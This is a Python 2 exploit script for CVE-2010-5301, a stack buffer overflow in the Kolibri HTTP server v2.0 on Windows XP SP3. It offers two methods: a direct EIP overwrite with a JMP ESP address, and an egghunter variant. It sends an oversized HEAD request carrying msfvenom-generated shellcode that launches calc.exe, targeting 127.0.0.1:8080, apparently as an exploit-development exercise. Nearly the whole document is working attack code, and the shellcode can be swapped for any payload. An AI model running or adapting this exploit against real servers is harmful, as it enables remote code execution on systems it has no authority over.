#!/usr/bin/python
# Title: Kolibrì HTTP server v2.0 - CVE-2010-5301
# Target binary: kolibrì.exe
# Target system: Windows XP SP3

#-------------------------------------------------------------------------------------------------------------------------------------------#
# This python script contains two exploits for the CVE-2010-5301:
# 1) Basic buffer overflow exploitation (releasing shellcode after overwriting the EIP)
# 2) Egghunter-based shellcode (dropping the egg + shellcode onto the buffer space, then releasing the egghunter after overwriting the EIP)
#-------------------------------------------------------------------------------------------------------------------------------------------#

import socket
import sys
from time import sleep

shellcode = "\x29\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
shellcode += "\x60\xd0\x19\x98\x83\xee\xfc\xe2\xf4\x9c\x38\x9b\x98\x60\xd0"
shellcode += "\x79\x11\x85\xe1\xd9\xfc\xeb\x80\x29\x13\x32\xdc\x92\xca\x74"
shellcode += "\x5b\x6b\xb0\x6f\x67\x53\xbe\x51\x2f\xb5\xa4\x01\xac\x1b\xb4"
shellcode += "\x40\x11\xd6\x95\x61\x17\xfb\x6a\x32\x87\x92\xca\x70\x5b\x53"
shellcode += "\xa4\xeb\x9c\x08\xe0\x83\x98\x18\x49\x31\x5b\x40\xb8\x61\x03"
shellcode += "\x92\xd1\x78\x33\x23\xd1\xeb\xe4\x92\x99\xb6\xe1\xe6\x34\xa1"
shellcode += "\x1f\x14\x99\xa7\xe8\xf9\xed\x96\xd3\x64\x60\x5b\xad\x3d\xed"
shellcode += "\x84\x88\x92\xc0\x44\xd1\xca\xfe\xeb\xdc\x52\x13\x38\xcc\x18"
shellcode += "\x4b\xeb\xd4\x92\x99\xb0\x59\x5d\xbc\x44\x8b\x42\xf9\x39\x8a"
shellcode += "\x48\x67\x80\x8f\x46\xc2\xeb\xc2\xf2\x15\x3d\xba\x18\x15\xe5"
shellcode += "\x62\x19\x98\x60\x80\x71\xa9\xeb\xbf\x9e\x67\xb5\x6b\xe9\x2d"
shellcode += "\xc2\x86\x71\x3e\xf5\x6d\x84\x67\xb5\xec\x1f\xe4\x6a\x50\xe2"
shellcode += "\x78\x15\xd5\xa2\xdf\x73\xa2\x76\xf2\x60\x83\xe6\x4d\x03\xb1"
shellcode += "\x75\xfb\x4e\xb5\x61\xfd\x60\xd0\x19\x98"
# msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00\x20\x3f\x43" -f c
# badchars: \x20\x3f\x43

#--------------------------------------------------------------------------------#

def egghunter_exploit():
    
    egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
    egghunter += "\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7"
    egghunter += "\xff\xe7"

    payload = "\x90"*4                  # offset: 515
    payload += "w00tw00t"               # egg
    payload += shellcode
    payload += b"A"*(515-len(payload))
    payload += "\x7b\x46\x86\x7c"       # 0x7C86467B --> JMP ESP - kernel32.dll
    payload += "\x90"*8
    payload += egghunter
    payload += b"C"*100


    buffer = (
"HEAD /" + payload + " HTTP/1.1\r\n"
"Host: 127.0.0.1:8080\r\n"
"User-Agent: " + "Exploit writer" + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n"
)
    return buffer

#---------------------------------------------------------------------------------#

def normal_exploitation():

    payload = b"A"*515
    payload += "\x7b\x46\x86\x7c"       # 0x7C86467B --> JMP ESP - kernel32.dll
    payload += "\x90"*8
    payload += shellcode

    buffer = (
"HEAD /" + payload + " HTTP/1.1\r\n"
"Host: 127.0.0.1:8080\r\n"
"User-Agent: " + "Exploit writer" + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n"
)
    return buffer

#----------------------------------------------------------------------------------#

def main():

    print "Welcome!"
    sleep(2)
    print "Please choose an exploitation option:\n"
    print "1) Basic exploitation\n2) Egghunter exploitation\n"
    selection = int(input("\n--> "))
    if selection == 1:
        buffer = normal_exploitation()
    elif selection == 2:
        buffer = egghunter_exploit()
    else:
        print "Wrong input. Try again\n"
        sys.exit()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 8080))
        s.send(buffer)
        s.close()

    except:
        print "Error connecting to the target. Exiting..."
        sys.exit()

if __name__ == "__main__":
    main()
